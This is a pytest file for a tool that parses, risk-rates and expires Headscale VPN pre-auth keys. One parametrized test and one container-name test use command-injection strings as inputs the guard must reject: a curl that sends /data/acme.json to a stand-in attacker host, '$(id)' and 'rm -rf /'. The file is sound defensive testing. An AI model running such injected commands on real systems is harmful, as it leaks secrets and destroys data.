"""Pre-auth keys were in no report, so nobody could have noticed them.

`check-expiry` asks Headscale about API keys. Pre-auth keys are a different
object with a different table and it never looked at them, so when three were
found live on 2026-08-23 -- reusable, never used, valid into 2027 -- nothing had
malfunctioned. Absence from a report nobody wrote is not evidence of absence.

The distinction that makes them worth their own verb: an API key administers
Headscale; a pre-auth key admits a machine to the mesh. In this fleet the mesh IS
the perimeter -- staging is VPN-only with no second gate behind it -- so a
`reusable` key that has not expired is a standing invitation for as long as it
lives.

Fixture text is real output captured from the VPS on 2026-08-23. Headscale
truncates prefixes itself (`hskey-auth-xxxx-***`), so no key material can appear
in this file even as the format changes.
"""

from __future__ import annotations

from datetime import datetime, timezone

import pytest

from toolkit.features.secret_expiry import (
    ExpiryUnavailableError,
    PreAuthKey,
    expire_headscale_preauthkey,
    headscale_preauthkeys,
    parse_headscale_preauthkeys,
)

REAL_OUTPUT = """ID | Key/Prefix                  | Reusable | Ephemeral | Used  | Expiration          | Created             | Owner
1  | hskey-auth-Z8j5XakEryR1-*** | true     | false     | false | 2026-02-22 05:42:46 | 2026-02-21 05:42:46 | kubelab
4  | hskey-auth-DKpQfYFYqT9M-*** | true     | true      | false | 2026-03-01 02:31:50 | 2026-02-28 02:31:50 | work
5  | hskey-auth-SDjO0ccHd0-Z-*** | true     | false     | false | 2027-03-13 17:08:18 | 2026-03-13 17:08:18 | work
20 | hskey-auth-s5HUmizG7RRZ-*** | true     | false     | false | 2027-03-23 03:07:29 | 2026-03-23 03:07:29 | kubelab
"""


class TestParsing:
    def test_it_reads_every_row(self) -> None:
        assert len(parse_headscale_preauthkeys(REAL_OUTPUT)) == 4

    def test_it_survives_ansi_colour(self) -> None:
        """headscale colours its table; the parser must not depend on a bare pipe."""
        coloured = "\x1b[96mID\x1b[0m | Key\n" + "\x1b[0m5 \x1b[0m| hskey-auth-x-*** | true | false | false | 2027-03-13 17:08:18 | 2026-03-13 17:08:18 | work\n"
        assert len(parse_headscale_preauthkeys(coloured)) == 1

    def test_it_reads_the_columns_in_the_right_order(self) -> None:
        """The preauth table is wider than the apikeys one and orders fields differently.

        Sharing a laxer pattern between the two would match the wrong field
        silently -- `ephemeral` sits where nothing else does, between `reusable`
        and `used`, so an off-by-one column reads a boolean that means something
        else entirely.
        """
        key = next(k for k in parse_headscale_preauthkeys(REAL_OUTPUT) if k.key_id == "4")
        assert key.reusable is True
        assert key.used is False
        assert key.owner == "work"

    def test_an_unparseable_line_is_skipped_not_guessed(self) -> None:
        assert parse_headscale_preauthkeys("garbage\n| | |\n") == []


class TestRisk:
    def test_a_live_reusable_unused_key_is_called_out(self) -> None:
        key = PreAuthKey(
            key_id="20",
            prefix="hskey-auth-x-***",
            reusable=True,
            used=False,
            expires_at=datetime(2027, 3, 23, tzinfo=timezone.utc),
            owner="kubelab",
        )
        assert key.is_live
        assert "REUSABLE" in key.risk

    def test_an_expired_key_is_not_live_whatever_its_flags(self) -> None:
        key = PreAuthKey(
            key_id="1",
            prefix="hskey-auth-x-***",
            reusable=True,
            used=False,
            expires_at=datetime(2026, 2, 22, tzinfo=timezone.utc),
            owner="kubelab",
        )
        assert not key.is_live
        assert key.risk == "expired"


class TestTalkingToTheServer:
    def test_an_unreachable_host_raises_rather_than_reporting_none(self, mocker) -> None:
        """A host that cannot be asked and a fleet with no keys look identical otherwise.

        Only one of those is safe to ignore, which is why this raises instead of
        returning [] -- the same rule `headscale_apikeys` follows.
        """
        mocker.patch(
            "toolkit.features.secret_expiry.subprocess.run",
            return_value=mocker.Mock(returncode=255, stdout="", stderr="ssh: connect timed out"),
        )
        with pytest.raises(ExpiryUnavailableError, match="could not ask headscale"):
            headscale_preauthkeys("deployer@vps")

    def test_an_empty_list_is_a_legitimate_answer_here(self, mocker) -> None:
        """Unlike API keys: the GCP hub's whole design is to store no pre-auth key.

        It mints a single-use one at boot, so a fleet legitimately holding none is
        the target state, not a failed query.
        """
        mocker.patch(
            "toolkit.features.secret_expiry.subprocess.run",
            return_value=mocker.Mock(returncode=0, stdout="ID | Key\n", stderr=""),
        )
        assert headscale_preauthkeys("deployer@vps") == []

    def test_expiry_passes_force_and_the_id_flag(self, mocker) -> None:
        """Verified against the running v0.28 binary, not assumed.

        It is `--id`, not `--identifier`. And `--force` is required rather than
        defensive: without it headscale prompts, and under BatchMode there is no
        terminal to answer, so the command stalls in a way that reads as a network
        fault.
        """
        run = mocker.patch(
            "toolkit.features.secret_expiry.subprocess.run",
            return_value=mocker.Mock(returncode=0, stdout="", stderr=""),
        )
        expire_headscale_preauthkey("deployer@vps", "20")
        command = run.call_args.args[0][-1]
        assert "--force" in command
        assert "--id 20" in command

    @pytest.mark.parametrize(
        "bad_id",
        ["20; curl attacker/?k=$(cat /data/acme.json)", "$(id)", "1 && rm -rf /", "", "abc"],
    )
    def test_a_non_numeric_id_is_refused_before_it_reaches_a_shell(self, mocker, bad_id) -> None:
        """Raised in review of #1353.

        The CLI is safe because it matches ids against headscale's own output, but
        this function is importable and interpolates the argument into a string a
        remote shell runs. The guard belongs where the string is built, not where
        today's only caller happens to be careful — and this call MUTATES, unlike
        the listing that shares the pattern.
        """
        run = mocker.patch("toolkit.features.secret_expiry.subprocess.run")
        with pytest.raises(ValueError, match="must be numeric"):
            expire_headscale_preauthkey("deployer@vps", bad_id)
        run.assert_not_called()

    def test_an_unsafe_container_name_is_refused(self, mocker) -> None:
        run = mocker.patch("toolkit.features.secret_expiry.subprocess.run")
        with pytest.raises(ValueError, match="unsafe container"):
            expire_headscale_preauthkey("deployer@vps", "20", container="head; rm -rf /")
        run.assert_not_called()

    def test_the_guard_is_a_raise_not_an_assert(self) -> None:
        """Assertions vanish under `python -O`; a guard an interpreter flag can
        switch off is not a guard."""
        import inspect

        src = inspect.getsource(expire_headscale_preauthkey)
        assert "raise ValueError" in src
        assert "assert " not in src

    def test_a_failed_expiry_raises(self, mocker) -> None:
        mocker.patch(
            "toolkit.features.secret_expiry.subprocess.run",
            return_value=mocker.Mock(returncode=1, stdout="", stderr="no such key"),
        )
        with pytest.raises(ExpiryUnavailableError, match="could not expire"):
            expire_headscale_preauthkey("deployer@vps", "999")
